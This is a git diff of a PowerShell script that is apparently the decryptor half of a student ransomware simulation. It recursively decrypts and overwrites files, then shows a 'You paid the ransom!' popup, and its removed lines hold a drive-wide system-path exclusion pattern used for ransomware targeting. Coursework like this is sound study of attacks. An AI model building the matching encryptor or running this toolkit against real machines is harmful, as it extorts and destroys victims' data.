@@ -1,30 +1,37 @@
-# Load the single-file encryption function
-. "C:\Path\Unprotect-AesFile.ps1" 
+#Loads decryption function from the Unprotect-AesFile
+. "C:\Users\Amna Shahid\github\CSEC-604-Project-Repo\Unprotect-AesFile.ps1" 
 
-# Define source drive and destination root
-$FilestoDecrypt = "C:\Path\Example_Test_Files"
-$Storage = "C:\Path\Storage" 
+#path to the source file/folder/drive to be decrypted 
+$FilestoDecrypt = "C:\Users\Amna Shahid\github\CSEC-604-Project-Repo\Example_Test_Files"
 
-#exclude critical and useless files from being encrypting so program can run smoothly 
-$ExcludePattern = "^C:\\Windows|^C:\\Program Files|^C:\\Program Files \(x86\)|^C:\\$Recycle.Bin|^C:\\System Volume Information|^C:\\Config.Msi|^C:\\MSOCache|^C:\\hiberfil.sys|^C:\\pagefile.sys|^C:\\swapfile.sys"
+#storage path where decrypted files will be stored temporarily 
+$Storage = "C:\Users\Amna Shahid\github\CSEC-604-Project-Repo\Storage" 
 
-# Use Get-ChildItem and filter out system paths before processing
+#Gets each object from the path given by using a for loop and recursion is used to reach all files if needed 
+#errors (mainly access based) are ignored so the program can run smoothly 
 Get-ChildItem -Path $FilestoDecrypt -File -Recurse -Force -ErrorAction SilentlyContinue | 
-    Where-Object { $_.FullName -notmatch $ExcludePattern } | 
+    Where-Object { $_.FullName } | 
     ForEach-Object {
-        # Calculate new path, preserving folder structure in the output folder 
+        #creates storage file 
+        New-Item -Path $Storage -ItemType Directory -Force | Out-Null
+
+        #New path is calculated while keeping the original folder structure 
         $relativePath = $_.FullName.Substring($FilestoDecrypt.Length)
-        $newFilePath   = Join-Path -Path $Storage -ChildPath ($relativePath + ".enc")
-        
-        # Call the existing function Unprotect-AesFile on each object 
+        $newPath   = Join-Path -Path $Storage -ChildPath ($relativePath -replace '\.enc$', '' )
+    
+        #Call the decryption function, Unprotect-AesFile on each object 
+        #Overwrite the contents of the original object with the decrypted contents in the temporary storage file 
         try {
             Write-Host "Decrypting: $($_.FullName)"
-            Unprotect-AesFile -InFile $_.FullName -OutFile $newFilePath -PasswordFile Password.txt
-            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($newFilePath))
+            Unprotect-AesFile -InFile $_.FullName -OutFile $newPath -PasswordFile Password.txt
+            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($newPath))
         }
         catch {
             Write-Warning "Unable to decrypt: $($_.FullName). Receiving error: $($_.Message)"
-        }
+        }   
 }
+#remove storage directory as those contents are no longer needed 
+Remove-Item -Path $Storage -Recurse -Force 
+
 $wshell = New-Object -ComObject Wscript.Shell
 $result = $wshell.popup("You paid the ransom! Your files are back to normal", 0)
